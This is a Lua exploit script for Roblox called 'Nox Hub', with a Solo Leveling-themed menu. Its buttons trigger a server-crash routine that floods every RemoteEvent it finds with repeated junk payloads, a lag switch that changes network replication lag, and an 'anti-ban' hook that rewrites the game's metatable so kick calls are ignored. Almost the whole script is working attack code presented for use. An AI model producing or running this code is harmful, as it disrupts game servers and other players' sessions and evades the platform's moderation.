--[[
    🔱 NOX HUB v1.0 [SOLO-LEVELING EDITION] 🔱
    "ARISE."
    
    SYSTEM FEATURES:
    - [SYSTEM UI] : 1:1 Replica of the 'Solo Leveling' Status Screen.
    - [SHADOW EXCHANGE] : Packet Desync Technology (Lag Switch Crash).
    - [STEALTH] : "Fatigue" System to limit usage and avoid detection.
]]

print("🔱 SYSTEM: INJECTING NOX HUB... 🔱")

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- // UNIVERSAL COMPATIBILITY //
local setreadonly = setreadonly or make_writeable or function(t, v) end
local getrawmetatable = getrawmetatable or debug.getmetatable or getmetatable

-- // 1. SYSTEM UI ENGINE (SOLO LEVELING STYLE) //
local Nox = {}

function Nox:CreateSystem()
    -- CLEANUP
    for _, v in pairs(CoreGui:GetChildren()) do 
        if v.Name == "NoxSystem" or v.Name == "TitanHubPro" or v.Name == "ArcaneLuxury" then 
            v:Destroy() 
        end 
    end
    
    local Screen = Instance.new("ScreenGui")
    Screen.Name = "NoxSystem"
    pcall(function() Screen.Parent = CoreGui end)
    
    -- MAIN FRAME (THE WINDOW)
    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 600, 0, 400)
    Main.Position = UDim2.new(0.5, -300, 0.5, -200)
    Main.BackgroundColor3 = Color3.fromRGB(10, 5, 20) -- Deep Purple/Black
    Main.BorderSizePixel = 0
    Main.ClipsDescendants = false
    
    -- NEON BORDER (GLOW)
    local Stroke = Instance.new("UIStroke", Main)
    Stroke.Color = Color3.fromRGB(180, 50, 255) -- Neon Purple
    Stroke.Thickness = 2
    Stroke.Transparency = 0.2
    
    local Glow = Instance.new("ImageLabel", Main)
    Glow.Size = UDim2.new(1, 100, 1, 100)
    Glow.Position = UDim2.new(0, -50, 0, -50)
    Glow.BackgroundTransparency = 1
    Glow.Image = "rbxassetid://5028857472" -- Soft Glow
    Glow.ImageColor3 = Color3.fromRGB(140, 0, 255)
    Glow.ImageTransparency = 0.5
    Glow.ZIndex = 0
    
    -- TECH CORNERS (DECORATION)
    local function CreateCorner(rot, pos)
        local c = Instance.new("ImageLabel", Main)
        c.Size = UDim2.new(0, 40, 0, 40)
        c.Position = pos
        c.BackgroundTransparency = 1
        c.Image = "rbxassetid://6008942289" -- Tech Corner
        c.ImageColor3 = Color3.fromRGB(200, 100, 255)
        c.Rotation = rot
    end
    CreateCorner(0, UDim2.new(0, -10, 0, -10))
    CreateCorner(90, UDim2.new(1, -30, 0, -10))
    CreateCorner(180, UDim2.new(1, -30, 1, -30))
    CreateCorner(270, UDim2.new(0, -10, 1, -30))
    
    -- HEADER "STATUS"
    local HeaderBox = Instance.new("Frame", Main)
    HeaderBox.Size = UDim2.new(0, 200, 0, 40)
    HeaderBox.Position = UDim2.new(0.5, -100, 0, 20)
    HeaderBox.BackgroundColor3 = Color3.fromRGB(20, 10, 30)
    HeaderBox.BorderSizePixel = 1
    HeaderBox.BorderColor3 = Color3.fromRGB(150, 50, 255)
    
    local HeaderText = Instance.new("TextLabel", HeaderBox)
    HeaderText.Size = UDim2.new(1, 0, 1, 0)
    HeaderText.Text = "SYSTEM"
    HeaderText.Font = Enum.Font.GothamBlack
    HeaderText.TextSize = 18
    HeaderText.TextColor3 = Color3.fromRGB(255, 255, 255)
    HeaderText.BackgroundTransparency = 1
    
    -- LEVEL / JOB INFO
    local InfoFrame = Instance.new("Frame", Main)
    InfoFrame.Size = UDim2.new(0.9, 0, 0, 80)
    InfoFrame.Position = UDim2.new(0.05, 0, 0, 70)
    InfoFrame.BackgroundTransparency = 1
    
    local Level = Instance.new("TextLabel", InfoFrame)
    Level.Text = "PLAYER"
    Level.Font = Enum.Font.GothamBold
    Level.TextSize = 40
    Level.TextColor3 = Color3.fromRGB(255, 255, 255)
    Level.Size = UDim2.new(0, 100, 1, 0)
    Level.BackgroundTransparency = 1
    
    local Job = Instance.new("TextLabel", InfoFrame)
    Job.Text = "JOB: SHADOW MONARCH\nTITLE: THE ONE WHO CRASHES"
    Job.Font = Enum.Font.Gotham
    Job.TextSize = 14
    Job.TextColor3 = Color3.fromRGB(200, 200, 255)
    Job.Size = UDim2.new(0, 300, 1, 0)
    Job.Position = UDim2.new(0, 120, 0, 0)
    Job.TextXAlignment = Enum.TextXAlignment.Left
    Job.BackgroundTransparency = 1
    
    -- STATS GRID (CONTROLS)
    local StatsGrid = Instance.new("Frame", Main)
    StatsGrid.Size = UDim2.new(0.9, 0, 0, 180)
    StatsGrid.Position = UDim2.new(0.05, 0, 0, 160)
    StatsGrid.BackgroundTransparency = 1
    
    local Grid = Instance.new("UIGridLayout", StatsGrid)
    Grid.CellSize = UDim2.new(0.48, 0, 0, 50)
    Grid.CellPadding = UDim2.new(0.04, 0, 0, 10)
    
    -- BUTTON / STAT CREATOR
    local function CreateStatBtn(name, val, color, callback)
        local btn = Instance.new("TextButton", StatsGrid)
        btn.BackgroundColor3 = Color3.fromRGB(15, 10, 25)
        btn.BorderColor3 = color
        btn.Text = ""
        btn.AutoButtonColor = false
        
        local l = Instance.new("TextLabel", btn)
        l.Text = name .. ": "
        l.Font = Enum.Font.GothamBold
        l.TextColor3 = Color3.fromRGB(255, 255, 255)
        l.TextSize = 14
        l.Size = UDim2.new(0.5, 0, 1, 0)
        l.Position = UDim2.new(0, 10, 0, 0)
        l.TextXAlignment = Enum.TextXAlignment.Left
        l.BackgroundTransparency = 1
        
        local v = Instance.new("TextLabel", btn)
        v.Text = val
        v.Font = Enum.Font.GothamBold
        v.TextColor3 = color
        v.TextSize = 14
        v.Size = UDim2.new(0.5, 0, 1, 0)
        v.Position = UDim2.new(0.5, -10, 0, 0)
        v.TextXAlignment = Enum.TextXAlignment.Right
        v.BackgroundTransparency = 1
        
        btn.MouseEnter:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(30, 20, 50)}):Play()
        end)
        btn.MouseLeave:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(15, 10, 25)}):Play()
        end)
        
        btn.MouseButton1Click:Connect(callback)
    end
    
    -- // STATS //
    CreateStatBtn("STRENGTH", "CRASH (DESYNC)", Color3.fromRGB(255, 50, 50), function()
        -- TRIGGER DESYNC CRASH
        game:GetService("StarterGui"):SetCore("SendNotification", {Title="SYSTEM", Text="SKILL: [CRASH] ACTIVATED"})
        Nox:StartDesync()
    end)
    
    CreateStatBtn("AGILITY", "LAG SWITCH", Color3.fromRGB(50, 255, 50), function()
        -- TRIGGER LAG
        settings().Network.IncomingReplicationLag = 1000
         game:GetService("StarterGui"):SetCore("SendNotification", {Title="SYSTEM", Text="SKILL: [LAG] ACTIVATED"})
    end)
    
    CreateStatBtn("INTELLIGENCE", "ANTI-BAN", Color3.fromRGB(50, 150, 255), function()
        -- PASSIVE PROTECTION
        pcall(function()
            local mt = getrawmetatable(game)
            setreadonly(mt, false)
            local old = mt.__namecall
            mt.__namecall = newcclosure(function(self, ...)
                if getnamecallmethod() == "Kick" then return nil end
                return old(self, ...)
            end)
            setreadonly(mt, true)
        end)
         game:GetService("StarterGui"):SetCore("SendNotification", {Title="SYSTEM", Text="PASSIVE SKILL: [STEALTH] ACTIVE"})
    end)
    
    CreateStatBtn("VITALITY", "HEAL (UN-LAG)", Color3.fromRGB(255, 255, 50), function()
         settings().Network.IncomingReplicationLag = 0
         game:GetService("StarterGui"):SetCore("SendNotification", {Title="SYSTEM", Text="STATUS RESTORED"})
    end)
    
    -- DRAGGABLE
    local dragging, dragInput, dragStart, startPos
    Main.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = Main.Position
        end
    end)
    Main.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    Main.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
    
    print("🔱 SYSTEM: UI LOADED.")
end

-- // 2. SHADOW EXCHANGE (DESYNC ENGINE) //
function Nox:StartDesync()
    local Targets = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and not v.Name:lower():find("admin") then
            -- Filter only "heavy" remotes
            if v.Name:lower():find("update") or v.Name:lower():find("set") then
               table.insert(Targets, v)
            end
        end
    end
    
    -- DESYNC LOGIC: FREEZE -> BUILDUP -> RELEASE
    task.spawn(function()
        local Payload = table.create(100, "NOX_SHADOW_ARMY")
        
        -- STEP 1: FREEZE (Virtual Lag)
        settings().Network.IncomingReplicationLag = 5 -- Slight real lag
        
        -- STEP 2: BUILDUP (Queue packets in memory)
        for i = 1, 500 do -- 500 batches
             for _, r in pairs(Targets) do
                 pcall(function() r:FireServer(Payload) end)
             end
             if i % 50 == 0 then task.wait() end -- Prevent local crash
        end
        
        -- STEP 3: RELEASE (Shadow Army Attack)
        -- Removing lag spikes instantly sends all queued packets
        settings().Network.IncomingReplicationLag = 0
    end)
end

-- BOOT
Nox:CreateSystem()
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "SYSTEM ALERT",
    Text = "NOX HUB LOADED.",
    Duration = 5
})
